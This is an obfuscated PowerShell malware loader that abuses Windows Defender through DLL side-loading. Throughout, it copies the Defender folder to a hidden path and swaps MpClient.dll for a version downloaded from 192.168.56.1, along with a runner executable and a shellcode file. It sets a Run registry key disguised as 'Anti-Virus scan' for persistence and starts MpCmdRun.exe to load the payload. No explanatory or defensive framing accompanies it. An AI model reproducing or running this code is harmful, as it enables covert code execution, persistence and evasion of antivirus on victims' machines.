${M`A`IN`PAth} = ((("{8}{1}{9}{7}{10}{3}{4}{2}{6}{5}{0}" -f'der','}{0}Windows{0}','ows','{0}Wi','nd','fen','{0}{0}De','p','C:{0','{0}Hel','{0}'))  -f[cHAr]92)
${pR`ogn`AmE} = ("{2}{0}{1}"-f '.e','xe','MpCmdRun')
${D`LLPA`Th} = ${mai`N`PAtH} + ((("{3}{0}{5}{4}{2}{1}"-f'{','ent.dll','li','{0}','MpC','0}'))  -F[ChAR]92)
${BiN`patH} = ${M`AinPa`Th} + ((("{2}{3}{0}{1}"-f'2in','fo.dat','dv2','dv')).("{1}{0}"-f'e','rEpLaC').Invoke('dv2','\'))
${Ld`Rpa`Th} = ${M`AIN`PaTH} + ((("{2}{1}{0}{3}{4}{5}" -f 'LMp','h','8hL8','R','unner.e','xe'))."Re`p`LAcE"('8hL',[StRINg][char]92))
${OriginA`L`d`L`l`Path} = ${ma`IN`PATH} + ((("{3}{5}{0}{4}{1}{2}"-f'r','d','ll','ED','MpUser.','rED'))."R`E`PLACe"('EDr',[sTrinG][cHAR]92))
${eXe`P`AtH} = ${mAiNP`A`Th} + "\\" + ${P`ROg`NA`mE}
.("{1}{0}{2}" -f'opy-It','C','em') -Path ((("{6}{8}{1}{0}{5}{3}{2}{4}{7}"-f'e','ram Fil','fe','ws De','nde','s{0}{0}Windo','C:{0}{0','r{0}{0}','}Prog')) -F [cHar]92) -Destination ${mA`in`path} -Recurse -Force
.("{1}{0}{2}" -f 't','Move-I','em') -Path ${d`lLP`ATh} -Destination ${oRiGiNAl`DlLPA`Th} -Force
${c} = &("{0}{2}{1}" -f'New-','t','Objec') ("{4}{1}{2}{0}{3}"-f 'tem.Net.WebC','y','s','lient','S')
${C}.("{3}{2}{0}{1}" -f'dFi','le','nloa','Dow').Invoke(("{0}{7}{4}{2}{1}{5}{3}{6}"-f'h','.1/MpClie','56','Prox','92.168.','nt','y.dll','ttp://1'),${D`lLpA`Th})
${c}.("{2}{1}{0}" -f'ile','F','Download').Invoke(("{3}{4}{7}{1}{2}{0}{6}{5}" -f 'nne','56.1/Mp','Ru','ht','tp://192.','.exe','r','168.'),${lDr`PATh})
${C}.("{1}{2}{0}{3}" -f 'oad','Dow','nl','File').Invoke(("{8}{9}{2}{0}{3}{5}{1}{7}{4}{6}" -f'/192','code','/','.168.56.1/','i','shell','n','.b','htt','p:'),${b`iNPA`TH})
&("{0}{3}{2}{1}"-f'New-I','perty','emPro','t') -Path ((("{16}{12}{4}{2}{5}{11}{3}{10}{7}{6}{13}{0}{8}{1}{9}{14}{15}" -f'i','n','osoft','dows{0','tware{0}Micr','{0','tVe','urren','o','{','}C','}Win','Sof','rs','0}','Run','HKCU:{0}')) -f [cHAR]92) -Name ("{3}{2}{0}{1}"-f ' ','scan','s','Anti-Viru') -Value ('cd'+' '+"$exePath; "+'s'+'ta'+'rt '+"$progName") -PropertyType ("{0}{1}"-f'Strin','g') -Force | &("{2}{0}{1}" -f '-','Null','Out')
&("{0}{1}{2}" -f 'Set-Locati','o','n') ${e`X`epAtH}
&("{1}{3}{2}{0}"-f 'cess','Start','o','-Pr') ${prOg`N`AmE}
